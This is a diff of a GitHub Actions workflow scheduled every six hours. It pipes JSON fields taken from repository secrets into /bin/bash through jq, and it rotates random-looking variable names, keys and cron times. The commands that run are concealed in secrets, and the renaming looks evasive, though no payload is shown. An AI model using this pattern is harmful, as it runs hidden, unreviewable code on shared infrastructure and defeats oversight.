@@ -1,26 +1,27 @@
 name: xiawushucc
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 5/6 * * *'
-jobs:  # 8757
+    - cron: '20 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xiawushucc
         env:
-          oyh1: ${{ secrets.oyh1 }}
+          suany5733: ${{ secrets.suany5733 }}
         run: |
-          echo $oyh1 | jq -r .j21 | /bin/bash
-          echo $w7223 | jq -r .mnty06408 | /bin/bash
-          echo $ppz03140 | jq -r .yv57 | /bin/bash
-          echo $uyxcq4 | jq -r .zigv4515 | /bin/bash
-          echo $kj534 | jq -r .k83983 | /bin/bash
-          echo $h9957 | jq -r .e71935 | /bin/bash
-          echo $r33 | jq -r .ft431 | /bin/bash
-          echo $bbz522 | jq -r .plfa174 | /bin/bash
-          echo $rhjdn482 | jq -r .hzqr68279 | /bin/bash
+          echo $suany5733 | jq -r .rsee2 | /bin/bash
+          echo $nh430 | jq -r .nvxp69 | /bin/bash
+          echo $urz8525 | jq -r .tebj155 | /bin/bash
+          echo $ja1800 | jq -r .wzoe62405 | /bin/bash
+          echo $jbe28 | jq -r .f2 | /bin/bash
+          echo $k0580 | jq -r .t2949 | /bin/bash
+          echo $ihcbq86266 | jq -r .nfn75 | /bin/bash
+          echo $me8662 | jq -r .h68 | /bin/bash
+          echo $jgz585 | jq -r .dvpsv73 | /bin/bash
+          echo $tx22 | jq -r .luw25164 | /bin/bash
+          echo $y1403 | jq -r .zv99716 | /bin/bash
 
